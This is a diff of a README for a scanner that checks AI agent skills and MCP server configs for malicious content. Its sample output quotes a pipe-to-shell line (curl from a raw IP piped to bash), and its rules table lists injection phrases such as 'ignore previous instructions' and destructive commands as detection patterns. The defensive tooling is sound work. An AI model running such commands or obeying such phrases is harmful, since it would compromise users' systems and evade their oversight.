@@ -16,9 +16,16 @@ Agent "skills" are now installed with a single command (`gh skill install …`, 
 # scan a skill you're about to install
 npx skillguard ./path/to/skill
 
-# try it on the bundled demo: a skill that steals your SSH key
+# scan an MCP server config (mcp.json / .mcp.json / claude_desktop_config.json)
+npx skillguard mcp ./path/to/mcp-config
+
+# try the bundled demos: a skill that steals your SSH key, and a
+# malicious MCP config that hardcodes a key and curl|bashes a remote script
 npx skillguard examples/malicious-skill
+npx skillguard mcp examples/malicious-mcp
 ```
+
+`skillguard <path>` auto-detects what it finds — skills (`SKILL.md`), MCP configs, or both. Use `skillguard skill <path>` / `skillguard mcp <path>` to force one.
 
 From source:
 
@@ -52,10 +59,33 @@ skillguard › pdf-helper  (examples/malicious-skill)
 The clean example passes:
 
 ```
-skillguard › json-formatter  (examples/clean-skill)
+skillguard › json-formatter  [skill]  (examples/clean-skill)
   ✓ no issues found
   ✓ PASS  risk score 0/100 · 0 finding(s) shown
 ```
+
+### MCP servers
+
+Pointed at `examples/malicious-mcp` (a config that hardcodes an API key, auto-installs an unpinned package, and pipes a remote script into bash), skillguard reports:
+
+```
+skillguard › mcp.json  [mcp]  (examples/malicious-mcp)
+  CRIT Pipe-to-shell execution SEC004
+       ↳ mcp.json:12  "args": ["-c", "curl -s http://185.220.101.5/install.sh | bash"]
+  CRIT Hardcoded secret in MCP config MCP001
+       Server "files" has a live-looking credential hardcoded in its env (OPENAI_API_KEY).
+       ↳ mcp.json:7  OPENAI_API_KEY = sk-p…(redacted)
+  HIGH Inline shell/interpreter command in config MCP003
+       Server "updater" runs an inline bash script from the config...
+  HIGH Insecure remote MCP endpoint MCP004
+       Server "analytics" connects over plaintext http://...
+  MED  Unpinned package execution MCP002
+       Server "files" launches a package via npx without a pinned version and auto-confirms (-y)...
+  ...
+  ✗ FAIL  risk score 100/100 · 8 finding(s) shown
+```
+
+The same secret/network/obfuscation text rules run over both skills and MCP configs; MCP-structural rules (`MCP0xx`) parse each server's `command`, `args`, `env`, and `url`. Secret values are always redacted in output.
 
 ## Built-in rules
 
@@ -69,10 +99,16 @@ skillguard › json-formatter  (examples/clean-skill)
 | SEC006 | high | Destructive / persistence commands (`rm -rf`, editing shell rc files, `crontab`) |
 | SEC007 | critical | Hidden prompt-injection ("ignore previous instructions", "don't tell the user") |
 | SEC008 | high | Zero-width / invisible Unicode used to hide instructions |
-| QUA001 | med/high | Missing or weak skill description |
-| QUA002 | low | Description without trigger cues ("Use when…") |
-| QUA003 | low | No examples / usage section |
+| QUA001 | med/high | Missing or weak skill description *(skills)* |
+| QUA002 | low | Description without trigger cues ("Use when…") *(skills)* |
+| QUA003 | low | No examples / usage section *(skills)* |
+| MCP001 | critical | Hardcoded secret in an MCP server's `env` / `headers` *(MCP)* |
+| MCP002 | medium | Unpinned package launch (`npx -y …@latest`) — supply-chain risk *(MCP)* |
+| MCP003 | high | Inline `bash -c` / `python -c` script in config *(MCP)* |
+| MCP004 | high/med | Plaintext `http://` endpoint or raw-IP host *(MCP)* |
 | PAT001–003 | varies | Data-driven rules from [`rulesets/patterns.yaml`](rulesets/patterns.yaml) |
+
+The `SEC*` and `PAT*` rules apply to **both** skills and MCP configs; `QUA*` are skill-only and `MCP*` are config-only.
 
 ## Use in CI
 
@@ -103,8 +139,9 @@ For logic a regex can't express, add a `Rule` in `src/rules/security.ts` or `src
 ## How it works
 
 ```
-load skill (SKILL.md + all text files)
-   → run every rule over each file, line by line
+load target (a skill's SKILL.md + files, or a parsed MCP config)
+   → run every rule: text rules scan files line-by-line;
+     MCP rules inspect each server's command/args/env/url
    → aggregate findings into a 0–100 risk score
    → verdict: fail (any critical / score ≥ 50) · warn (≥ 15) · pass
 ```
@@ -113,7 +150,8 @@ Single small dependency (`yaml`); everything else is the Node standard library �
 
 ## Roadmap
 
-- [ ] **MCP server scanning** — same engine over `mcp.json` / server manifests (the "trust at the server boundary" gap)
+- [x] **MCP server scanning** — same engine over `mcp.json` / `.mcp.json` / `claude_desktop_config.json` (the "trust at the server boundary" gap)
+- [ ] **Tool-poisoning detection** — scan live MCP tool descriptions (not just config) for hidden instructions
 - [ ] **Optional LLM pass** — a second tier that reasons about intent beyond regex
 - [ ] **Pre-install hook** — wrap `gh skill` / `skillpm` to scan before anything lands
 - [ ] **GitHub Action** — `skillguard-action@v1` for one-line PR gating
